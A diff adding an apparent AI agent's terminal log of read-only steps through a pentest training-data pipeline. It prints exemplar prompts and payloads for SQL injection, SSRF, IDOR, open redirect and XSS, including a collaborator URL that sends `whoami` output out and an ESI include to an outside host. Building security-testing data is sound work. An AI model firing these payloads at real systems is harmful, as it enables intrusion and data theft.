@@ -1,0 +1,954 @@
+[0m
+> build · beam-free
+[0m
+[0m→ [0mRead training_resources/enrichment/specs/ssrf_a.md
+[0m
+[0m$ [0mls -la training_resources/enrichment/ 2>/dev/null; echo "---"; ls training_resources/enrichment/candidates/ 2>/dev/null; echo "---"; ls training_resources/enrichment/specs/ 2>/dev/null
+total 28
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:23 .
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:15 ..
+-rwxr-xr-x 1 MSI 197121 13791 Oct 18 20:23 build_specs.py
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:15 candidates
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:23 logs
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:15 reviews
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:18 specs
+---
+---
+base_prompts.json
+idor_a.md
+idor_b.md
+open_redirect_a.md
+open_redirect_b.md
+sqli_a.md
+sqli_b.md
+ssrf_a.md
+ssrf_b.md
+xss_reflected_a.md
+xss_reflected_b.md
+[0m
+[0m$ [0mls -la training_resources/enrichment/candidates/; echo "---"; ls training_resources/enrichment/reviews/; echo "---"; cat training_resources/enrichment/base_prompts.json 2>/dev/null | head -100
+total 4
+drwxr-xr-x 1 MSI 197121 0 Oct 18 20:15 .
+drwxr-xr-x 1 MSI 197121 0 Oct 18 20:23 ..
+---
+---
+[0m
+[0m$ [0mfind training_resources/enrichment -type f | head -50
+training_resources/enrichment/build_specs.py
+training_resources/enrichment/logs/sqli_a.log
+training_resources/enrichment/logs/ssrf_a.log
+training_resources/enrichment/specs/base_prompts.json
+training_resources/enrichment/specs/idor_a.md
+training_resources/enrichment/specs/idor_b.md
+training_resources/enrichment/specs/open_redirect_a.md
+training_resources/enrichment/specs/open_redirect_b.md
+training_resources/enrichment/specs/sqli_a.md
+training_resources/enrichment/specs/sqli_b.md
+training_resources/enrichment/specs/ssrf_a.md
+training_resources/enrichment/specs/ssrf_b.md
+training_resources/enrichment/specs/xss_reflected_a.md
+training_resources/enrichment/specs/xss_reflected_b.md
+[0m
+[0m$ [0mcat training_resources/enrichment/logs/ssrf_a.log
+[0m
+> build · beam-free
+[0m
+[0m→ [0mRead training_resources/enrichment/specs/ssrf_a.md
+[0m
+[0m$ [0mls -la training_resources/enrichment/ 2>/dev/null; echo "---"; ls training_resources/enrichment/candidates/ 2>/dev/null; echo "---"; ls training_resources/enrichment/specs/ 2>/dev/null
+total 28
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:23 .
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:15 ..
+-rwxr-xr-x 1 MSI 197121 13791 Oct 18 20:23 build_specs.py
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:15 candidates
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:23 logs
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:15 reviews
+drwxr-xr-x 1 MSI 197121     0 Oct 18 20:18 specs
+---
+---
+base_prompts.json
+idor_a.md
+idor_b.md
+open_redirect_a.md
+open_redirect_b.md
+sqli_a.md
+sqli_b.md
+ssrf_a.md
+ssrf_b.md
+xss_reflected_a.md
+xss_reflected_b.md
+[0m
+[0m$ [0mls -la training_resources/enrichment/candidates/; echo "---"; ls training_resources/enrichment/reviews/; echo "---"; cat training_resources/enrichment/base_prompts.json 2>/dev/null | head -100
+total 4
+drwxr-xr-x 1 MSI 197121 0 Oct 18 20:15 .
+drwxr-xr-x 1 MSI 197121 0 Oct 18 20:23 ..
+---
+---
+[0m
+[0m$ [0mfind training_resources/enrichment -type f | head -50
+training_resources/enrichment/build_specs.py
+training_resources/enrichment/logs/sqli_a.log
+training_resources/enrichment/logs/ssrf_a.log
+training_resources/enrichment/specs/base_prompts.json
+training_resources/enrichment/specs/idor_a.md
+training_resources/enrichment/specs/idor_b.md
+training_resources/enrichment/specs/open_redirect_a.md
+training_resources/enrichment/specs/open_redirect_b.md
+training_resources/enrichment/specs/sqli_a.md
+training_resources/enrichment/specs/sqli_b.md
+training_resources/enrichment/specs/ssrf_a.md
+training_resources/enrichment/specs/ssrf_b.md
+training_resources/enrichment/specs/xss_reflected_a.md
+training_resources/enrichment/specs/xss_reflected_b.md
+[0m
+[0m
+[0m$ [0mcat training_resources/enrichment/specs/base_prompts.json
+{
+  "sqli": {
+    "system": "You are a specialist security researcher focused exclusively on sqli vulnerabilities. SQL injection means user input reaches a SQL interpreter and changes query semantics. Choose the technique the evidence supports: error-based, boolean-based, time-based, union-based, stacked queries or out-of-band exfiltration; respect DBMS fingerprints (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and any filter constraints (blocked chars, WAF). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+  },
+  "sqli_exemplars": [
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on sqli vulnerabilities. SQL injection means user input reaches a SQL interpreter and changes query semantics. Choose the technique the evidence supports: error-based, boolean-based, time-based, union-based, stacked queries or out-of-band exfiltration; respect DBMS fingerprints (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and any filter constraints (blocked chars, WAF). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /products?id=3\nTarget parameter(s): id\nRecon evidence: Appending a single quote to id=3 returns 'You have an error in your SQL syntax; ... near ''' at line 1'.\nPlanner's rationale: Raw DB error on quote proves direct SQL concatenation and fingerprints MySQL."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"sqli\", \"target_param\": \"id\", \"payload\": \"'\", \"injection_point\": \"query\", \"expected_success_signal\": \"MySQL-flavoured SQL syntax error rendered in the HTTP response\", \"confidence\": 0.95, \"reasoning\": \"The unescaped quote breaks the string literal and the raw MySQL error leaks, which simultaneously confirms injection and fingerprints the DBMS, so the classic quote probe is the correct first step.\"}"
+        }
+      ]
+    },
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on sqli vulnerabilities. SQL injection means user input reaches a SQL interpreter and changes query semantics. Reason about entry-point contexts, comment syntax, logical/arithmetic confirmation, DBMS identification, union/error/boolean/time-based extraction, stacked queries, out-of-band exfiltration and WAF/filter bypasses, respecting DBMS differences (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MS Access). Techniques from HackTricks by Carlos Polop (commit f66c437, CC-BY-NC-4.0); see source/source_manifest.json for provenance. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: POST /register\nTarget parameter(s): username (form body)\nRecon evidence: Legacy MySQL; username column capped at 30 chars; uniqueness checked before truncation.\nPlanner's rationale: SQL truncation impersonates admin."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"sqli\", \"target_param\": \"username\", \"payload\": \"admin [30 spaces] a\", \"injection_point\": \"body\", \"expected_success_signal\": \"Account stored as 'admin' with the attacker's password (legacy versions error out instead)\", \"confidence\": 0.5, \"reasoning\": \"The truncation attack pads past the column length so the uniqueness check sees the long value but storage truncates to 'admin'; the README notes modern MySQL rejects over-length inserts, so success implies an old build.\"}"
+        }
+      ]
+    }
+  ],
+  "ssrf": {
+    "system": "You are a specialist security researcher focused exclusively on ssrf vulnerabilities. Server-side request forgery means the server fetches a URL you influence. Target internal services, cloud instance metadata endpoints, alternative schemes (file, gopher, dict, sftp, tftp) and filter bypasses (IP encodings, DNS names, redirects, parser discrepancies). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+  },
+  "ssrf_exemplars": [
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on ssrf vulnerabilities. Server-side request forgery means the server fetches a URL you influence. Target internal services, cloud instance metadata endpoints, alternative schemes (file, gopher, dict, sftp, tftp) and filter bypasses (IP encodings, DNS names, redirects, parser discrepancies). You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /api/fetch?url=\nTarget parameter(s): url\nRecon evidence: Response includes a rendered preview of the page at url=; a test against an internal 10.x host returned its content.\nPlanner's rationale: Full-response SSRF: the server fetches arbitrary URLs and shows us the result."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"ssrf\", \"target_param\": \"url\", \"payload\": \"http://127.0.0.1:80\", \"injection_point\": \"query\", \"expected_success_signal\": \"Internal web service banner/content from localhost rendered in the response\", \"confidence\": 0.9, \"reasoning\": \"The server fetches and reflects the URL contents, so the loopback address reaches services that are otherwise firewalled off; the response body is the direct success signal.\"}"
+        }
+      ]
+    },
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on ssrf vulnerabilities. Server-side request forgery means the server fetches a URL you influence. Reason about interaction capture, alternative schemes (file, dict, sftp, tftp, ldap, gopher), redirect-based and DNS-rebinding bypasses, URL parser inconsistencies, loopback/integer/hex/octal IP notations, domain confusion tricks, infrastructure gadgets (PDF renderers, proxies, SNI, filename mini-languages) and cloud metadata endpoints (AWS, GCP, Azure, Oracle, Alibaba, IBM, Kubernetes, Docker). Techniques from HackTricks by Carlos Polop (commit f66c437, CC-BY-NC-4.0); see source/source_manifest.json for provenance. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /import?url=\nTarget parameter(s): url\nRecon evidence: Command injection co-occurs with the fetch parameter in a template.\nPlanner's rationale: Backtick command substitution inside the URL value."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"ssrf\", \"target_param\": \"url\", \"payload\": \"url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`\", \"injection_point\": \"query\", \"expected_success_signal\": \"DNS query for the subdomain carrying the whoami output\", \"confidence\": 0.55, \"reasoning\": \"The SSRF-with-command-injection row: when the value is later used unquoted in a shell template, the backticks execute locally and the collaborator label captures stdout.\"}"
+        }
+      ]
+    }
+  ],
+  "idor": {
+    "system": "You are a specialist security researcher focused exclusively on idor vulnerabilities. Insecure direct object reference means a user-supplied identifier selects an object without an ownership/authorization check. Craft the exact identifier tamper (increment, decode and re-encode, predict, wildcard, method or content-type change) that returns another principal's object. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+  },
+  "idor_exemplars": [
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on idor vulnerabilities. Insecure direct object reference means a user-supplied identifier selects an object without an ownership/authorization check. Craft the exact identifier tamper (increment, decode and re-encode, predict, wildcard, method or content-type change) that returns another principal's object. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /profile?user_id=123\nTarget parameter(s): user_id\nRecon evidence: user_id is a sequential integer; while logged in as user 123, requesting 122 and 124 returns those users' full profiles (name, email, address).\nPlanner's rationale: User-controlled object identifier with no ownership check observed on adjacent IDs."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"idor\", \"target_param\": \"user_id\", \"payload\": \"user_id=124\", \"injection_point\": \"query\", \"expected_success_signal\": \"HTTP 200 with another user's profile data in the response body\", \"confidence\": 0.9, \"reasoning\": \"The backend looks up the record purely from the user-supplied identifier and never compares it to the session principal, so incrementing the ID returns other users' data - the canonical IDOR walkthrough from the cheat sheet.\"}"
+        }
+      ]
+    },
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on idor vulnerabilities. Insecure direct object reference means a user-supplied identifier selects an object without an ownership/authorization check. Reason about identifier locations (path, query, body, headers/cookies), sequential or predictable IDs, same-session tampering, enumeration workflows (curl loops, ffuf with response filtering), error-message oracles, search-index substring oracles and encoded/opaque identifier reuse. Techniques from HackTricks by Carlos Polop (commit f66c437, CC-BY-NC-4.0); see source/source_manifest.json for provenance. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /api/orders?cursor=\nTarget parameter(s): cursor (query)\nRecon evidence: Pagination cursors encode object references; own cursor decodes to order IDs.\nPlanner's rationale: Decode, tamper and re-encode opaque cursors."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"idor\", \"target_param\": \"cursor\", \"payload\": \"base64decode(cursor) -> tamper ids -> base64encode -> resend\", \"injection_point\": \"query\", \"expected_success_signal\": \"Foreign orders listed through the forged cursor\", \"confidence\": 0.6, \"reasoning\": \"Encoding (base64/hex) is presentation, not authorization — the wristband lesson generalises to any opaque token that internally carries enumerable object references.\"}"
+        }
+      ]
+    }
+  ],
+  "open_redirect": {
+    "system": "You are a specialist security researcher focused exclusively on open_redirect vulnerabilities. Open redirect means a user-controllable value makes the application or browser navigate to an attacker-controlled host. Craft the URL value that survives the observed validation (whitelist, scheme, slash, dot, character filters) and still points at the attacker host. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+  },
+  "open_redirect_exemplars": [
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on open_redirect vulnerabilities. Open redirect means a user-controllable value makes the application or browser navigate to an attacker-controlled host. Craft the URL value that survives the observed validation (whitelist, scheme, slash, dot, character filters) and still points at the attacker host. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /login?next=/dashboard\nTarget parameter(s): next\nRecon evidence: After successful login the 302 Location header mirrors the next parameter verbatim (tested with /other).\nPlanner's rationale: Unvalidated redirect target reflected into the Location header."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"open_redirect\", \"target_param\": \"next\", \"payload\": \"https://evil.com\", \"injection_point\": \"query\", \"expected_success_signal\": \"302 with Location: https://evil.com\", \"confidence\": 0.95, \"reasoning\": \"The parameter is copied straight into the redirect target with no validation, so a full absolute URL to the attacker host is the simplest possible payload and lands the victim on the phishing site after login.\"}"
+        }
+      ]
+    },
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on open_redirect vulnerabilities. Open redirect means a user-controllable value makes the application or browser navigate to an attacker-controlled destination. Reason about loopback notations, scheme-relative URLs, userinfo and backslash parser tricks, whitelist/regex footguns, javascript: pivots and CRLF/scheme-splitting filters, DOM redirect sinks, fragment smuggling, parameter discovery and OAuth redirect_uri escalation. Techniques from HackTricks by Carlos Polop (commit f66c437, CC-BY-NC-4.0); see source/source_manifest.json for provenance. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /sso/callback\nTarget parameter(s): code (OAuth flow)\nRecon evidence: Open redirect inside an OAuth/OIDC redirect_uri path confirmed.\nPlanner's rationale: Escalate the redirect to a code/token leak."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"open_redirect\", \"target_param\": \"code\", \"payload\": \"redirect_uri=https://app.example.com/logout?next=//evil.example (victim pre-authenticated at IdP)\", \"injection_point\": \"query\", \"expected_success_signal\": \"Authorization code delivered to evil.example; silent approval makes it one-click\", \"confidence\": 0.7, \"reasoning\": \"The OAuth section: repeat with the victim already logged into the IdP — silent approval converts the redirect flaw into an account-takeover-grade token leak.\"}"
+        }
+      ]
+    }
+  ],
+  "xss_reflected": {
+    "system": "You are a specialist security researcher focused exclusively on xss_reflected vulnerabilities. Reflected XSS means a value you control is echoed into HTML or JavaScript and executed. Identify the reflection context (raw HTML, tag attribute, JS string, template literal), then choose context-matched payloads: tag injection, event handlers, javascript:/data: schemes, encoding bypasses (HTML entities, unicode, hex/octal), parenthesis-free execution, template interpolation, DOM sinks and WAF blacklist evasion. Techniques from HackTricks by Carlos Polop (commit f66c437, CC-BY-NC-4.0); see source/source_manifest.json for provenance. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+  },
+  "xss_reflected_exemplars": [
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on xss_reflected vulnerabilities. Reflected XSS means a value you control is echoed into HTML or JavaScript and executed. Identify the reflection context (raw HTML, tag attribute, JS string, template literal), then choose context-matched payloads: tag injection, event handlers, javascript:/data: schemes, encoding bypasses (HTML entities, unicode, hex/octal), parenthesis-free execution, template interpolation, DOM sinks and WAF blacklist evasion. Techniques from HackTricks by Carlos Polop (commit f66c437, CC-BY-NC-4.0); see source/source_manifest.json for provenance. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /search?q=laptop\nTarget parameter(s): q\nRecon evidence: The q value is reflected unescaped into the page body; < and > survive verbatim.\nPlanner's rationale: Classic tag injection in raw HTML context."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"xss_reflected\", \"target_param\": \"q\", \"payload\": \"<script>alert(1)</script>\", \"injection_point\": \"query\", \"expected_success_signal\": \"alert(1) fires in the browser\", \"confidence\": 0.95, \"reasoning\": \"The raw-HTML payload list starts with script/img/svg tags; once angle brackets survive reflection, a new tag with an executable element is the canonical first shot.\"}"
+        }
+      ]
+    },
+    {
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a specialist security researcher focused exclusively on xss_reflected vulnerabilities. Reflected XSS means a value you control is echoed into HTML or JavaScript and executed. Identify the reflection context (raw HTML, tag attribute, JS string, template literal), then choose context-matched payloads: tag injection, event handlers, javascript:/data: schemes, encoding bypasses (HTML entities, unicode, hex/octal), parenthesis-free execution, template interpolation, DOM sinks and WAF blacklist evasion. Techniques from HackTricks by Carlos Polop (commit f66c437, CC-BY-NC-4.0); see source/source_manifest.json for provenance. You receive an endpoint, target parameter(s), recon evidence and the planner's rationale; select the single most promising next payload and justify it. Output ONLY a single JSON object matching this schema: {\"vuln_class\": string, \"target_param\": string, \"payload\": string, \"injection_point\": string, \"expected_success_signal\": string, \"confidence\": number, \"reasoning\": string} where injection_point is one of: query, body, header, cookie, path; confidence is your calibrated probability (0.0-1.0) that the payload achieves the expected success signal given the evidence; reasoning explains in 1-3 sentences why this payload fits the observed behaviour. No markdown, no code fences, no text outside the JSON object."
+        },
+        {
+          "role": "user",
+          "content": "Endpoint: GET /cache-purge?url=x\nTarget parameter(s): url\nRecon evidence: XSS confirmed on a site behind an edge cache that processes ESI.\nPlanner's rationale: ESI include turns XSS into server-side fetch."
+        },
+        {
+          "role": "assistant",
+          "content": "{\"vuln_class\": \"xss_reflected\", \"target_param\": \"url\", \"payload\": \"<esi:include src=\\\"http://yoursite.com/capture\\\" />\", \"injection_point\": \"query\", \"expected_success_signal\": \"Edge server fetches the included URL, proving ESI injection\", \"confidence\": 0.6, \"reasoning\": \"The XSS-to-SSRF section: Edge Side Includes are processed by the cache, so an esi:include tag executes server-side regardless of browser CSP or sanitisation.\"}"
+        }
+      ]
+    }
+  ]
+}
+[0m
+[0m$ [0msed -n '1,200p' training_resources/enrichment/build_specs.py
+#!/usr/bin/env python3
+"""Build per-run task specs for delegating training-data enrichment to opencode free models.
+
+Each spec is a self-contained markdown brief: an opencode agent reads it and writes one
+candidate JSONL file under candidates/. Specs are deterministic so runs are reproducible.
+
+Run:  python training_resources/enrichment/build_specs.py
+"""
+
+import json
+import os
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+BASE = json.load(open(os.path.join(HERE, "specs", "base_prompts.json"), encoding="utf-8"))
+
+CLASSES = ["sqli", "ssrf", "idor", "open_redirect", "xss_reflected"]
+
+RUNS = {
+    "sqli": [
+        dict(
+            run_id="a", model="opencode/nemotron-3-ultra-free", count=15,
+            emphasis=[
+                "error-based confirmation across MySQL, PostgreSQL, MSSQL, Oracle and SQLite (use each DBMS's real error syntax, e.g. MySQL syntax-error text, MSSQL conversion error, Oracle ORA- errors, PostgreSQL CAST errors)",
+                "UNION-based extraction: column counting with ORDER BY / NULL padding, valid union selects per DBMS, MySQL GROUP_CONCAT, information_schema enumeration",
+                "numeric vs string parameter contexts, LIKE/WHERE clause injection, JSON API body parameters, ORDER BY column injection",
+                "injection points beyond query: X-Forwarded-For / Referer / User-Agent headers, cookie values, and URL path segments",
+            ],
+        ),
+        dict(
+            run_id="b", model="opencode/longcat-2.5-preview-free", count=15,
+            emphasis=[
+                "boolean-based blind extraction (AND 1=1 / 1=2 differentiators, substring oracles, search filters)",
+                "time-based blind (MySQL SLEEP, PostgreSQL pg_sleep, MSSQL WAITFOR DELAY, heavy-calculation Oracle tricks)",
+                "stacked queries where the driver allows them, and authentication-bypass login forms (' OR 1=1 -- variants, admin'-- style)",
+                "WAF/filter bypass: inline comment splitting /*!50000*/, URL/hex encoding, case variation, no-quote techniques (CHAR(), 0x hex literals), and out-of-band DNS exfiltration (LOAD_FILE UNC, UTL_HTTP style) as a later-stage technique",
+            ],
+        ),
+    ],
+    "ssrf": [
+        dict(
+            run_id="a", model="opencode/beam-free", count=15,
+            emphasis=[
+                "direct URL fetch in query/body params (webhooks, importers, avatar/url-preview features, PDF generators)",
+                "alternative schemes: file:///etc/passwd and Windows paths, dict:// port probing, gopher:// crafted requests",
+                "loopback notations: 127.1, 0x7f000001, 017700000001, [::1], 127.0.0.1 vs 0.0.0.0, short forms",
+                "internal network port scanning via response timing/error differences, and error-message oracles that leak fetched content",
+            ],
+        ),
+        dict(
+            run_id="b", model="opencode/nemotron-3-ultra-free", count=15,
+            emphasis=[
+                "redirect-based bypass (attacker server 302 -> internal target), DNS rebinding / tolower-rebinding style tricks",
+                "URL parser inconsistencies: userinfo http://evil@internal, backslash http://internal\\\\@evil or evil\\\\\\\\@internal variants, encoded hosts, trailing dots",
+                "cloud metadata endpoints: AWS IMDS (and IMDSv2 token limitation), GCP metadata headers, Azure IMDS, with realistic response signals",
+                "allowlist bypass via attacker-controlled subdomain of an allowed domain, open-redirect chaining, and SNI/host-header confusion through a forward proxy",
+            ],
+        ),
+    ],
+    "idor": [
+        dict(
+            run_id="a", model="opencode/longcat-2.5-preview-free", count=15,
+            emphasis=[
+                "sequential numeric path identifiers (/api/users/123, /invoices/0042) with response-size filtering during enumeration",
+                "UUID and hash identifiers reused across endpoints, encoded identifiers (base64) that decode to sequential IDs",
+                "error-message oracles (403 vs 404 vs 200) that make hidden-object enumeration measurable",
+                "role escalation: regular user reading admin/other-user resources by swapping the id in path, query, or nested JSON body",
+            ],
+        ),
+        dict(
+            run_id="b", model="opencode/beam-free", count=15,
+            emphasis=[
+                "identifier tampering in JSON body fields, PUT/PATCH object ownership checks, HTTP method confusion (GET safe, POST leaks)",
+                "cookie/header-borne identifiers (account switch ids, weak session-to-account binding) swapped within the same session",
+                "same-session tampering workflows: change own id to another user's and diff responses; pagination/page-size enumeration",
+                "search or substring oracles (admin search leaking other tenants), and cross-tenant references in messaging/file-download features",
+            ],
+        ),
+    ],
+    "open_redirect": [
+        dict(
+            run_id="a", model="opencode/nemotron-3-ultra-free", count=13,
+            emphasis=[
+                "classic param redirects (?next=, ?url=, ?returnTo=, ?redirect=) with absolute-URL validation that scheme-relative //evil.com and /\\evil.com style inputs evade",
+                "userinfo and parser tricks: https://trusted.com@evil.com, backslash mixing, at-sign confusion",
+                "allowlist footguns: substring/regex matching (starts-with, contains trusted.com, unanchored patterns) and subdomain confusion (trusted.com.evil.com)",
+                "server-side Location header behaviour: 301/302/307 differences, CRLF header splitting in redirect targets, and encoded hosts (%2F%2F, double encoding)",
+            ],
+        ),
+        dict(
+            run_id="b", model="opencode/longcat-2.5-preview-free", count=12,
+            emphasis=[
+                "DOM-based redirect sinks: location.hash, location.search values passed to location.href/assign/replace, open() pivots",
+                "javascript: scheme acceptance in sanitizers that only block http/https absolute URLs",
+                "OAuth/OIDC redirect_uri and post-logout redirect escalation, state-parameter interplay",
